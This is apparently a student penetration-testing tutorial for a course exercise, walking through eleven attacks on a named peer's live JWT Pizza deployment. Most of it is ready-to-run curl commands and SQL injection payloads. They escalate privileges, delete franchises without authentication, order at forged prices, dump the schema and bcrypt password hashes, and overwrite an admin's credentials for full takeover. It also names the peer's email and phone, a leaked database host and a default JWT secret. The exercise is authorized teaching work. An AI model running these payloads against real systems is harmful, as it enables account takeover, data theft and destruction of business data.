# Peer Penetration Test Tutorial: Attacking Marco's JWT Pizza

> **Target:** Marco Sotomarino's JWT Pizza deployment
> **Authorization:** This test is conducted as part of BYU CS 329 with peer consent.
> **Peer contact:** marco97@byu.edu / 801-651-1440
> **Last recon:** April 13, 2026

---

## Before You Begin

**Ground rules for attacking a peer's system:**

1. You have explicit permission to test Marco's deployment as part of the CS 329 deliverable. This does NOT extend to any other systems.
2. Avoid destructive operations whenever possible. If you must test a destructive endpoint, create your own test data first and delete that.
3. Document everything — screenshots, terminal output, HTTP responses. Even failed attacks are valuable evidence.
4. If you accidentally break something, contact Marco immediately.

**Tools you will need:**

- `curl` (command line HTTP client)
- A web browser with developer tools
- `node` (Node.js — for JWT manipulation, run from `jwt-pizza-service/` directory which has `jsonwebtoken` installed)
- **Burp Suite Community Edition** (free — download from https://portswigger.net/burp/communitydownload)
- A screenshot tool

**Endpoints:**

| Component      | URL                                       |
| -------------- | ----------------------------------------- |
| Frontend       | https://pizza.marcosotomarino.com         |
| Backend API    | https://pizza-service.marcosotomarino.com |
| Pizza Factory  | https://pizza-factory.cs329.click         |

---

## Phase 1: Verify Your Recon (5 minutes)

Before you fire a single attack, confirm that the intelligence from recon is still valid.

### Step 1.1: Confirm the API is alive

```bash
curl -s https://pizza-service.marcosotomarino.com/
```

Expected: `{"message":"welcome to JWT Pizza","version":"00010101.010101"}`

### Step 1.2: Log in as pentest2

We have a registered account on Marco's system.

```bash
curl -s -X PUT https://pizza-service.marcosotomarino.com/api/auth \
  -H "Content-Type: application/json" \
  -d '{"email":"pentest2@test.com","password":"pentest123"}'
```

Save the token:

```bash
export TOKEN="<paste the token from the response>"
```

If the account was deleted, register a fresh one:

```bash
curl -s -X POST https://pizza-service.marcosotomarino.com/api/auth \
  -H "Content-Type: application/json" \
  -d '{"name":"pentest3","email":"pentest3@test.com","password":"pentest123"}'
```

**Note your user ID from the response — you'll need it for attack commands.**

### Step 1.3: Confirm menu and franchises

```bash
# Menu
curl -s https://pizza-service.marcosotomarino.com/api/order/menu

# Franchises (public endpoint, no auth needed)
curl -s https://pizza-service.marcosotomarino.com/api/franchise
```

As of April 13 recon:
- **Menu:** 5 items (IDs 2-6): Veggie, Margarita, Crusty, Charred Leopard, Pepperoni
- **Franchises:** "My Pizza Franchise" (ID 1, has store "Main Store" ID 1), "SLC" (ID 2, no stores)

Use **menuId 2** (Veggie, $0.0038) for order attacks. Use **franchise ID 2** ("SLC", no stores) if you need a safe deletion target.

### Step 1.4: Decode your token

```bash
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null
```

Confirm: your `id`, `roles` (should be `diner`), and check for `exp` claim. Recon confirmed tokens have NO `exp` — they never expire.

**If all checks pass, you have a confirmed foothold. Time to attack.**

---

## Phase 2: The Attacks

You need at least 5 attacks for the deliverable. Below are 11 attacks covering 5 different OWASP categories. All have been confirmed vulnerable as of April 13, 2026.

---

### Attack 1: SQL Injection — Privilege Escalation (A03 Injection)

**CONFIRMED VULNERABLE** — tested April 13, 2026.

**What happens:** The `PUT /api/user/:userId` endpoint uses string concatenation to build SQL. Injecting `admin'-- ` in the name field comments out the WHERE clause, causing the UPDATE to hit user ID 1 instead of your user. The server returns a JWT for user ID 1 — privilege escalation.

**WARNING:** This modifies the database. The injection without a WHERE clause affects ALL rows' `name` column. Be prepared to explain this to Marco.

#### Step-by-step

**1a. Send the SQL injection payload:**

```bash
curl -s -X PUT "https://pizza-service.marcosotomarino.com/api/user/<YOUR_USER_ID>" \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"email":"test@test.com","name":"admin'\''-- "}'
```

Replace `<YOUR_USER_ID>` with your user ID (e.g., 17).

**What to look for:** The response returns a JWT with `"id": 1` — a DIFFERENT user than you authenticated as. This proves the SQL injection worked and you modified another user's record.

Example response (from April 13 testing):
```json
{
  "user": {
    "id": 1,
    "name": "admin",
    "email": "test@test.com",
    "roles": [{"role": "diner"}]
  },
  "token": "eyJhbG..."
}
```

**1b. Show SQL structure via error-based injection:**

```bash
curl -s -X PUT "https://pizza-service.marcosotomarino.com/api/user/<YOUR_USER_ID>" \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"email":"x'\'' UNION SELECT id,name,email,password FROM user WHERE '\''1'\''='\''1","password":"test"}'
```

This will return an error message that reveals the SQL query structure, table name (`user`), column names, and file paths.

**1c. Clean up after yourself:**

```bash
curl -s -X PUT "https://pizza-service.marcosotomarino.com/api/user/<YOUR_USER_ID>" \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"email":"pentest2@test.com","name":"pentest2","password":"pentest123"}'
```

**Record this as:** Severity 4 (Critical). OWASP A03 Injection. The attacker can modify any user's record and receive their JWT.

---

### Attack 2: Unauthenticated Franchise Deletion (A01 Broken Access Control)

**CONFIRMED VULNERABLE** — tested April 13, 2026.

**What happens:** The `DELETE /api/franchise/:franchiseId` endpoint has NO authentication middleware. Anyone on the internet can delete any franchise without logging in.

#### Step-by-step

**2a. First, note the current franchises:**

```bash
curl -s https://pizza-service.marcosotomarino.com/api/franchise
```

**2b. Delete an empty franchise with NO auth header:**

Pick a franchise with no stores (e.g., "SLC" ID 2). Do NOT delete franchise ID 1 — it has a store.

```bash
curl -s -X DELETE https://pizza-service.marcosotomarino.com/api/franchise/2 \
  -w "\nHTTP_CODE: %{http_code}"
```

Expected: `{"message":"franchise deleted"}` with HTTP 200. No login, no token, nothing.

**2c. Verify it's gone:**

```bash
curl -s https://pizza-service.marcosotomarino.com/api/franchise
```

**Note:** You can't recreate the franchise without admin access. Let Marco know so he can restore it.

**Record this as:** Severity 4 (Critical). OWASP A01 Broken Access Control. Any anonymous user can destroy business data.

---

### Attack 3: Free Pizza — Client-Side Price Manipulation (A04 Insecure Design)

**CONFIRMED VULNERABLE** — tested April 13, 2026. Both zero and negative prices accepted.

**What happens:** The server trusts the `price` field from the client without validating against the menu database. You can order pizza for free or even for a negative price.

#### Step-by-step

**3a. Check the real menu prices:**

```bash
curl -s https://pizza-service.marcosotomarino.com/api/order/menu
```

Note: Veggie (menuId 2) costs $0.0038.

**3b. Order at a manipulated price:**

```bash
curl -s -X POST https://pizza-service.marcosotomarino.com/api/order \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"franchiseId":1,"storeId":1,"items":[{"menuId":2,"description":"Veggie","price":0.0001}]}'
```

Expected: Order accepted at the fraudulent price. The pizza factory even issues a valid signed JWT for the order.

**3c. (Optional) Try a negative price:**

```bash
curl -s -X POST https://pizza-service.marcosotomarino.com/api/order \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"franchiseId":1,"storeId":1,"items":[{"menuId":2,"description":"Veggie","price":-100}]}'
```

This also works — the server accepts negative prices. In a real system, this could credit money to the attacker.

**Record this as:** Severity 3 (High). OWASP A04 Insecure Design. Unlimited free (or negative-price) pizza.

---

### Attack 4: Information Disclosure & Security Misconfiguration (A05)

**CONFIRMED VULNERABLE** — all findings confirmed April 13, 2026.

**What happens:** Multiple misconfiguration issues leak internal architecture details.

#### Step-by-step

**4a. Leaked database hostname in /api/docs:**

```bash
curl -s https://pizza-service.marcosotomarino.com/api/docs | grep -o '"db":"[^"]*"'
```

Expected: `"db":"jwt-pizza-db.csdC8skiue7b.us-east-1.rds.amazonaws.com"`

This reveals the AWS RDS instance name, region (us-east-1), and specific identifier.

**4b. Stack trace leakage — send malformed JSON:**

```bash
curl -s -X PUT https://pizza-service.marcosotomarino.com/api/auth \
  -H 'Content-Type: application/json' \
  -d 'not json'
```

Expected: Full stack trace revealing `/app/node_modules/body-parser/...`, Node.js runtime version, internal file paths.

**4c. Stack trace on auth failure:**

```bash
curl -s -X PUT https://pizza-service.marcosotomarino.com/api/auth \
  -H 'Content-Type: application/json' \
  -d '{"email":"doesnotexist@nowhere.com","password":"anything"}'
```

Expected: Stack trace revealing `/app/src/database/database.js:107` and `/app/src/routes/authRouter.js:110`.

**4d. X-Powered-By and missing security headers:**

```bash
curl -sI https://pizza-service.marcosotomarino.com/
```

Look for:
- `X-Powered-By: Express` — should be removed
- **Missing:** `Content-Security-Policy`, `Strict-Transport-Security`, `X-Frame-Options`, `X-Content-Type-Options`

**4e. CORS origin reflection:**

```bash
curl -sI https://pizza-service.marcosotomarino.com/api/franchise \
  -H "Origin: https://evil-attacker.com"
```

Expected:
```
access-control-allow-origin: https://evil-attacker.com
access-control-allow-credentials: true
```

Any malicious website can make authenticated cross-origin requests.

**Record this as:** Severity 2 (Medium). OWASP A05 Security Misconfiguration. Multiple information leaks that aid further attacks.

---

### Attack 5: JWT Forgery Attempt (A02 Cryptographic Failures)

**CONFIRMED: Forgery FAILS** — Marco changed the JWT secret. However, the lack of token expiry is still a cryptographic failure.

**What happens:** The source code `.env` has `JWT_SECRET=dev-secret-key-change-in-production`. We try to forge an admin JWT with this secret. If it fails, we document the missing `exp` claim instead.

#### Step-by-step

**5a. Forge an admin JWT (run from jwt-pizza-service directory):**

```bash
cd /path/to/jwt-pizza-service
FORGED=$(node -e "
  const jwt = require('jsonwebtoken');
  const token = jwt.sign(
    {id: 17, name: 'pentest2', email: 'pentest2@test.com', roles: [{role: 'admin'}]},
    'dev-secret-key-change-in-production'
  );
  console.log(token);
")
echo "Forged token: $FORGED"
```

**5b. Test the forged token:**

```bash
curl -s https://pizza-service.marcosotomarino.com/api/order \
  -H "Authorization: Bearer $FORGED"
```

Expected: `{"message":"unauthorized"}` — Marco changed the secret. Document this as a severity 0 (unsuccessful) for the forgery itself.

**5c. Document the missing expiry as a separate finding:**

```bash
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null
```

Note there is NO `exp` claim — only `iat`. Tokens never expire. A stolen token is valid forever.

**Record this as:** Severity 0 for the forgery attempt (blocked). Severity 2 for the missing expiry (separate finding or note). OWASP A02 Cryptographic Failures.

---

### Attack 6: Brute Force — No Rate Limiting (A07 Authentication Failures)

**Use Burp Suite for this attack** — the course requires the Burp Suite prerequisite exercise.

#### Step-by-step with Burp Suite

**6a. Open Burp Suite and launch the proxy browser:**

1. Open Burp Suite Community Edition
2. Create a **Temporary project** > **Start Burp** with defaults
3. Click the **Proxy** tab > **Open browser**

**6b. Capture a login request:**

1. In the Burp browser, navigate to `https://pizza.marcosotomarino.com`
2. Click Login, enter any email/password, submit
3. In Burp, click **Proxy > HTTP history**
4. Find the `PUT /api/auth` request — right-click it > **Send to Intruder**

**6c. Configure the Intruder attack:**

1. Click the **Intruder** tab
2. In **Payload positions**, find the password value in the request body
3. Highlight just the password value and click **Add §** so it looks like:
   ```
   {"email":"pentest2@test.com","password":"§test§"}
   ```
4. Click the **Payloads** tab
5. Add candidate passwords one by one using the **Add** input:
   - `admin`, `password`, `123456`, `test`, `pizza`, `pentest123`, `secret`, `franchisee`, `diner`, `changeme`, `qwerty`, `letmein`
6. Click **Start attack** (dismiss the Community Edition throttle warning)

**6d. Analyze results:**

- Look at the **Status** and **Length** columns
- A `200` status code = successful login
- `pentest123` should return 200 (our known password)
- All others should return 404

**Key finding:** There is no rate limiting, no CAPTCHA, no account lockout. An attacker can try unlimited passwords. Take a screenshot of the Intruder results window.

**Record this as:** Severity 2 (Medium). OWASP A07 Identification and Authentication Failures. No brute force protection on login endpoint.

---

### Attack 7 (Bonus): CORS Cross-Origin Exploitation (A05)

If you want a standalone CORS attack record (separate from Attack 4), you can demonstrate a full exploitation scenario.

#### Step-by-step

**7a. Show the CORS reflection:**

```bash
curl -sI https://pizza-service.marcosotomarino.com/api/franchise \
  -H "Origin: https://evil-attacker.com"
```

Note: `access-control-allow-origin: https://evil-attacker.com` with `access-control-allow-credentials: true`.

**7b. Explain the attack scenario:**

A malicious website at `https://evil-attacker.com` could include JavaScript that:
1. Makes a `fetch()` to `https://pizza-service.marcosotomarino.com/api/order` with `credentials: 'include'`
2. The browser sends the victim's auth cookie/token along with the request
3. The server reflects the malicious origin, so the browser allows the response to be read
4. The attacker's JavaScript now has the victim's order data, user info, or can perform actions on their behalf

**Record this as:** Severity 3 (High). OWASP A05 Security Misconfiguration.

---

### Attack 8: SQL Injection via LIMIT/OFFSET Parameters (A03 Injection)

**CONFIRMED VULNERABLE** — tested April 13, 2026.

**What happens:** The `page` query parameter on `GET /api/order` and `GET /api/franchise` is interpolated directly into SQL LIMIT/OFFSET clauses via template literals. Injecting non-numeric values triggers errors that leak internal file paths and confirm the injection point. This is a separate injection vector from Attack 1.

#### Step-by-step

**8a. Inject a SQL string into the page parameter (orders endpoint):**

```bash
curl -s "https://pizza-service.marcosotomarino.com/api/order?page=1%3B%20SELECT%201" \
  -H "Authorization: Bearer $TOKEN"
```

Expected: An error response with `"Undeclared variable: NaN"` and a full stack trace revealing `database.js:475` (query function), `database.js:223` (getOrders), and `orderRouter.js:117`.

**8b. Use a negative page value to reveal LIMIT/OFFSET structure:**

```bash
curl -s "https://pizza-service.marcosotomarino.com/api/order?page=-1" \
  -H "Authorization: Bearer $TOKEN"
```

Expected: SQL syntax error containing `near '-20,10'` — this confirms the page value is used to compute an offset (`(page - 1) * 10 = -20`) and a limit of 10, both interpolated directly into the SQL string.

**8c. Confirm the same vulnerability on the franchise endpoint (no auth required):**

```bash
curl -s "https://pizza-service.marcosotomarino.com/api/franchise?page=1%3B%20SELECT%201"
```

Expected: Same `"Undeclared variable: NaN"` error, this time revealing `database.js:340` (getFranchises) and `franchiseRouter.js:83`. Note this endpoint doesn't even require authentication.

**Record this as:** Severity 2 (Medium). OWASP A03 Injection. While JavaScript's type coercion to NaN prevents direct UNION-based extraction here, the error messages leak internal file paths and confirm unparameterized query patterns.

---

### Attack 9: SQL Injection — Full Database Extraction (A03 Injection)

**CONFIRMED VULNERABLE** — tested April 13, 2026.

**What happens:** Extending Attack 1's SQL injection in `PUT /api/user/:userId`, you can use a nested subquery technique to extract data from any table in the database. The key insight is injecting into the SET clause while preserving a WHERE clause that targets your own user, so the extracted data appears in the API response's `name` field.

**WARNING:** This attack modifies your user's `name` field each time. The data you extract will be visible as your username until you clean it up.

**Prerequisites:** You need a second test account for this attack. If you only have pentest2 (ID 17), register pentest3 first:

```bash
curl -s -X POST https://pizza-service.marcosotomarino.com/api/auth \
  -H "Content-Type: application/json" \
  -d '{"name":"pentest3","email":"pentest3@test.com","password":"pentest123"}'
```

Save the new user's ID and token. In the commands below, replace `<ID>` with your user ID (e.g., 22) and `$TOKEN` with a valid token.

#### Technique explained

The injection payload structure is:

```sql
-- What you send in the name field:
x', name=(SELECT x FROM (SELECT <target_column> AS x FROM <target_table> WHERE <condition>) AS tmp) WHERE id=<YOUR_ID>--

-- Resulting SQL on the server:
UPDATE user SET name='x', name=(SELECT x FROM (SELECT <target_column> AS x FROM <target_table> WHERE <condition>) AS tmp) WHERE id=<YOUR_ID>-- ', email='...' WHERE id=<YOUR_ID>
```

The `-- ` comments out the rest of the query. The nested subquery (`SELECT x FROM (SELECT ... AS tmp)`) is needed to bypass MySQL's restriction against specifying the target table in a subquery of an UPDATE.

#### Step-by-step

**9a. Extract the full database schema — all table names:**

```bash
curl -s -X PUT "https://pizza-service.marcosotomarino.com/api/user/<ID>" \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"email":"pentest3@test.com","name":"x'"'"', name=(SELECT GROUP_CONCAT(table_name SEPARATOR '"'"'|'"'"') FROM information_schema.tables WHERE table_schema=database()) WHERE id=<ID>-- "}'
```

Expected: The response's `name` field contains all table names separated by `|`:

```
auth|dinerOrder|franchise|menu|orderItem|store|user|userRole
```

This reveals the complete database schema — 8 tables.

**9b. Extract all user roles — identify admin accounts:**

```bash
curl -s -X PUT "https://pizza-service.marcosotomarino.com/api/user/<ID>" \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"email":"pentest3@test.com","name":"x'"'"', name=(SELECT GROUP_CONCAT(userId,'"'"':'"'"',role SEPARATOR '"'"'|'"'"') FROM userRole) WHERE id=<ID>-- "}'
```

Expected: The `name` field contains all role assignments like `1:diner|2:diner|3:diner|3:admin|2:admin|2:franchisee|...`. Look for users with the `admin` role — these are your high-value targets.

**9c. Extract a password hash (for user 1):**

```bash
curl -s -X PUT "https://pizza-service.marcosotomarino.com/api/user/<ID>" \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"email":"pentest3@test.com","name":"x'"'"', name=(SELECT x FROM (SELECT password AS x FROM user WHERE id=1) AS tmp) WHERE id=<ID>-- "}'
```

Expected: The `name` field contains a bcrypt hash like `$2b$10$myn0NQ5XGs7cgGcbdajW6../AtiA8Wl/ql89aWrNegHSadJw4ACBG`.

**9d. Extract password hash for an admin account (user 2):**

```bash
curl -s -X PUT "https://pizza-service.marcosotomarino.com/api/user/<ID>" \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"email":"pentest3@test.com","name":"x'"'"', name=(SELECT x FROM (SELECT password AS x FROM user WHERE id=2) AS tmp) WHERE id=<ID>-- "}'
```

**9e. Extract password hash for user 3 (another admin):**

```bash
curl -s -X PUT "https://pizza-service.marcosotomarino.com/api/user/<ID>" \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"email":"pentest3@test.com","name":"x'"'"', name=(SELECT x FROM (SELECT password AS x FROM user WHERE id=3) AS tmp) WHERE id=<ID>-- "}'
```

With these bcrypt hashes, an attacker could run offline cracking with `hashcat` or `john the ripper`.

**9f. Clean up — restore your name:**

```bash
curl -s -X PUT "https://pizza-service.marcosotomarino.com/api/user/<ID>" \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"email":"pentest3@test.com","name":"pentest3"}'
```

**Record this as:** Severity 4 (Critical). OWASP A03 Injection. Complete database extraction — schema, all user roles, and bcrypt password hashes for every account including admins.

---

### Attack 10: Frontend Admin Dashboard Disclosure (A01 Broken Access Control)

**CONFIRMED VULNERABLE** — tested April 13, 2026.

**What happens:** The frontend is a React SPA served from CloudFront/S3. All routes serve the same `index.html` with the full JavaScript bundle. Any unauthenticated user can navigate to `/admin-dashboard` and the browser renders the admin UI components, revealing interface structure, API endpoint patterns, and management schemas. The `robots.txt` also advertises sensitive paths.

#### Step-by-step

**10a. Access the admin dashboard without authentication:**

```bash
curl -s "https://pizza.marcosotomarino.com/admin-dashboard" | head -15
```

Expected: The full HTML page with the SPA bundle (`index-CsPcqWP-.js`) is served. Open `https://pizza.marcosotomarino.com/admin-dashboard` in a browser to see the admin UI render client-side — take a screenshot for your records.

**10b. Check robots.txt for advertised sensitive paths:**

```bash
curl -s "https://pizza.marcosotomarino.com/robots.txt"
```

Expected:

```
User-agent: *
Disallow: /admin-dashboard/
Disallow: /docs/
```

This tells every crawler (and attacker) exactly where the sensitive endpoints are. Disallowing a path in `robots.txt` does NOT restrict access — it just advertises it.

**10c. Check version disclosure:**

```bash
curl -s "https://pizza.marcosotomarino.com/version.json"
```

Expected: `{"version":"20000101.000000"}` — frontend version publicly accessible.

**Record this as:** Severity 2 (Medium). OWASP A01 Broken Access Control. Route protection is client-side only (React nav link visibility), not enforced at the route level. `robots.txt` advertises sensitive paths to attackers.

---

### Attack 11: Full Kill Chain — SQLi to Admin Takeover to Franchise Creation (A03 + A01)

**CONFIRMED VULNERABLE** — tested April 13, 2026.

**What happens:** This demonstrates a complete attack chain from a self-registered diner account to full administrative control of the system. You chain the SQL injection from Attacks 1/9 to overwrite an admin account's credentials with your own, log in as admin, and then create business data to prove full control.

**WARNING:** This is the most destructive attack. It overwrites a real admin account's email and password. Coordinate with Marco before and after.

**Prerequisites:** You need:
- A test account (pentest3, ID `<ID>`) with a known password (`pentest123`)
- The admin user IDs from Attack 9b (user 2 = admin + franchisee, user 3 = admin)
- A valid `$TOKEN` for your test account

#### Kill chain overview

```
Register diner account (pentest3, ID <ID>)
    │
    ▼
SQLi: Extract userRole table → identify user 2 as admin       (Attack 9b)
    │
    ▼
SQLi: Extract user 2's password hash                           (Attack 9d)
    │
    ▼
SQLi: Overwrite user 2's email + password with known values    (Step 1 below)
    │
    ▼
Login as user 2 → receive admin JWT                            (Step 2 below)
    │
    ▼
Create franchise "Pwned Pizza" + store "Hacker HQ"             (Step 3 below)
```

#### Step-by-step

**11a. Overwrite the admin's credentials via SQLi:**

This injection copies your test account's password hash (which corresponds to the known password `pentest123`) onto user 2, and sets user 2's email to a value you control:

```bash
curl -s -X PUT "https://pizza-service.marcosotomarino.com/api/user/<ID>" \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"email":"pentest3@test.com","name":"x'"'"', email='"'"'admin-pwned@test.com'"'"', password=(SELECT x FROM (SELECT password AS x FROM user WHERE id=<ID>) AS tmp) WHERE id=2-- "}'
```

The resulting SQL:

```sql
UPDATE user SET name='x', email='admin-pwned@test.com',
  password=(SELECT x FROM (SELECT password AS x FROM user WHERE id=<ID>) AS tmp)
  WHERE id=2-- ', email='pentest3@test.com' WHERE id=<ID>
```

The response will show your own user (the endpoint returns the authenticated user), but the admin credential overwrite happened silently in the database.

**11b. Log in as the admin:**

```bash
curl -s -X PUT "https://pizza-service.marcosotomarino.com/api/auth" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin-pwned@test.com","password":"pentest123"}'
```

Expected: A response with `"id": 2` and roles including `admin`, `diner`, and `franchisee`. Save this admin token:

```bash
export ADMIN_TOKEN="<paste the admin token>"
```

**11c. Create a franchise as admin (proof of full control):**

```bash
curl -s -X POST "https://pizza-service.marcosotomarino.com/api/franchise" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -d '{"name":"Pwned Pizza","admins":[{"email":"pentest3@test.com"}]}'
```

Expected: `{"name":"Pwned Pizza","admins":[...],"id":4}` — a new franchise created under your control.

**11d. Add a store to prove persistent business impact:**

```bash
curl -s -X POST "https://pizza-service.marcosotomarino.com/api/franchise/4/store" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -d '{"name":"Hacker HQ"}'
```

Expected: `{"id":2,"franchiseId":4,"name":"Hacker HQ"}`

**11e. Verify the final state:**

```bash
curl -s https://pizza-service.marcosotomarino.com/api/franchise
```

You should see "Pwned Pizza" with "Hacker HQ" alongside Marco's legitimate franchises.

**11f. Clean up (coordinate with Marco):**

With the admin token, you could restore the original admin email/password if you saved the original hash from Attack 9d. Otherwise, let Marco know so he can reset his admin credentials.

**Record this as:** Severity 4 (Critical). OWASP A03 Injection / A01 Broken Access Control. Complete privilege escalation from anonymous registration to full admin control with persistent business impact. The root cause is the SQL injection — fixing parameterized queries in `database.js:updateUser()` blocks this entire chain.

---

## Phase 3: Write Your Attack Records

For each attack, use this table format:

```markdown
| Item           | Result                                                        |
| -------------- | ------------------------------------------------------------- |
| Date           | [date you ran the attack]                                     |
| Target         | pizza-service.marcosotomarino.com                             |
| Classification | [OWASP category]                                              |
| Severity       | [0-4]                                                         |
| Description    | [What you did, what happened, why it matters]                 |
| Images         | See below                                                     |
| Corrections    | [What code change would fix this]                             |
```

Follow each table with the actual curl commands and responses as code blocks (this IS your evidence/images).

Save your attack records to:
`/Users/jayellis/dev/byu/cs329/jwt-pizza/penetrationTests/peerAttackRecords.md`

---

## Phase 4: Combine Into Final Report

After completing your attacks, merge everything into `peerTest.md`:

1. Both peers' names (Jay Ellis + Marco Sotomarino)
2. Self attack records (from `selfAttackRecords.md` — already done, 7 attacks)
3. Peer attack records (your attacks on Marco + Marco's attacks on you)
4. Combined summary of learnings
5. Star rating for Marco (log into Pizza Factory to submit)

---

## Quick Reference: Confirmed Vulnerability Status (April 13)

| Vulnerability                   | Status         | Attack #  |
| ------------------------------- | -------------- | --------- |
| SQL injection (user update)     | **VULNERABLE** | 1, 9, 11  |
| SQL injection (LIMIT/OFFSET)    | **VULNERABLE** | 8         |
| Unauth franchise deletion       | **VULNERABLE** | 2         |
| Price manipulation (free pizza) | **VULNERABLE** | 3         |
| Stack trace / info disclosure   | **VULNERABLE** | 4         |
| CORS origin reflection          | **VULNERABLE** | 4, 7      |
| DB host in /api/docs            | **VULNERABLE** | 4         |
| Missing security headers        | **VULNERABLE** | 4         |
| JWT forgery (default secret)    | **PATCHED**    | 5         |
| No JWT expiry                   | **VULNERABLE** | 5         |
| No rate limiting                | **VULNERABLE** | 6         |
| Frontend admin disclosure       | **VULNERABLE** | 10        |
| Full kill chain (admin takeover)| **VULNERABLE** | 11        |
| Default admin credentials       | **PATCHED**    | N/A       |

## Quick Reference: Key Values

| Item                     | Value                                                    |
| ------------------------ | -------------------------------------------------------- |
| Test account email       | pentest2@test.com                                        |
| Test account pass        | pentest123                                               |
| Test account user ID     | 17                                                       |
| Menu ID for orders       | 2 (Veggie, $0.0038)                                     |
| Safe franchise to delete | ID 2 ("SLC", no stores)                                 |
| DB host (leaked)         | jwt-pizza-db.csdC8skiue7b.us-east-1.rds.amazonaws.com   |
| JWT secret (default)     | dev-secret-key-change-in-production (REJECTED by server) |
